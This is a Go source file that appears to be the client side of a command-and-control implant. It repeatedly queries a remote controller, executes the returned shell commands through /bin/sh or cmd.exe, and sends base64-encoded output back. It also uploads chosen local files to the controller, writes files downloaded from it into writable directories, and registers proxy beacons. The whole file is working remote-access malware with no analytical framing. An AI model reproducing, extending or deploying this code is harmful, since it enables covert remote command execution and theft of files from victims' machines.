package main

import (
	"os"
	"io"
	"fmt"
	"bytes"
	"os/exec"
	"strings"
	"runtime"
	"net/http"
	"encoding/json"
    "mime/multipart"
	b64 "encoding/base64"
)

func (packet BeaconHttp) queryServer() {
	resp, err := queryCommandHttp(string(packet.data))
	debugFatal(err)

	if err == nil {
		defer resp.Body.Close()

		if err != nil || resp.Status != "200 OK" {
			fmt.Println("Command status != 200: " + resp.Status)
		}
		
		controlDataBytes, err := io.ReadAll(resp.Body)
		debugFatal(err)

		var commResp CommandResponse
		json.Unmarshal(controlDataBytes, &commResp)
		
		packet.handleQueryResponse(commResp)
	} else if debug {
		fmt.Println("Couldn't reach command.")
	}
}

func (packet BeaconHttp) addProxyClient(client Beacon) {
	packet.proxyClients = append(packet.proxyClients, client)
}

func queryCommandHttp(endpoint string) (resp *http.Response, err error) {
	url := "http://" + cmdAddress + ":" + cmdPort + "/" + endpoint
	req, err := http.NewRequest("GET", url, nil)
	debugFatal(err)
	req.Host = cmdHost
	return netClient.Do(req)
}

func (packet BeaconHttp) handleQueryResponse(commResp CommandResponse) {
	for _, cmd := range commResp.Exec {
		//cmdSplit := strings.Fields(cmd);
		output := []byte{}
		
		if runtime.GOOS == "linux" {
			command := []string{ "-c", cmd }
			output, _ = exec.Command("/bin/sh", command...).Output()
		} else if runtime.GOOS == "windows" {
			command := []string { "/c", cmd }
			output, _ = exec.Command("cmd", command...).Output()
		}

		if len(output) > 0 {
			data, err := json.Marshal(CommandUpdate{ip,id,"exec",output})
			debugFatal(err)
			encoded := b64.StdEncoding.EncodeToString(data)
			queryCommandHttp(encoded)
		}
	}

	for _, file := range commResp.Download {
		packet.upload(file)
	}

	for _, file := range commResp.Upload {
		packet.download(file)
	}

	for _, client := range commResp.ProxyClients {
		var beacon Beacon
		json.Unmarshal([]byte(client), &beacon)
		fmt.Println("Adding proxy " + beacon.Id)
		packet.addProxyClient(beacon)
	}
}

func (packet BeaconHttp) download(filePath string) {
	filename := filePath
	if filename[0] == '/' || filename[0] == '~' {
		f := strings.Split(filename, "/")
		filename = f[len(f)-1]
	}

	result := "0"

	url := "http://" + cmdAddress + ":" + cmdPort + "/d/" + b64.StdEncoding.EncodeToString([]byte(filePath))
	req, err := http.NewRequest("GET", url, nil)
	debugFatal(err)
	req.Host = "command.com"
	resp, err := netClient.Do(req)
	fmt.Println(url)
	debugFatal(err)
	defer resp.Body.Close()
	targetDir := ""

	for _, loc := range writeCheckLocations {
		out, err := os.Create(loc + "/" + filename)
		debugFatal(err)

		if err != nil {
			continue
		}

		defer out.Close()

		_, err = io.Copy(out, resp.Body)
		debugFatal(err)
		
		if err != nil {
			continue
		}

		result = "1"
		targetDir = loc
		break
	}

	result += ";" + targetDir + "/" + filename

	data, err := json.Marshal(CommandUpdate{ip,id,"upload", []byte(result)})
	debugFatal(err)
	
	if err != nil {
		return
	}

	encoded := b64.StdEncoding.EncodeToString(data)
	queryCommandHttp(encoded)
}

func (packet BeaconHttp) upload(filename string) {
	data, err := json.Marshal(CommandUpdate{ip,id,"upload", []byte(filename)})
	debugFatal(err)
	
	if err != nil {
		return
	}

	encoded := b64.StdEncoding.EncodeToString(data)
	url := "http://" + cmdAddress + ":" + cmdPort + "/" + encoded
	
    var b bytes.Buffer
    w := multipart.NewWriter(&b)
    var fw io.Writer
    file, err := os.Open(filename)
    debugFatal(err)
	
	if err != nil {
		return
	}
	if fw, err = w.CreateFormFile("file", file.Name()); err != nil {
    	debugFatal(err)
		return
    }    
	if _, err = io.Copy(fw, file); err != nil {
		debugFatal(err)
		return
    }

    w.Close()

	req, err := http.NewRequest("POST", url, &b)
	req.Host = cmdHost
	debugFatal(err)
	req.Header.Set("Content-Type", w.FormDataContentType())
    _, err = netClient.Do(req)
	debugFatal(err)
}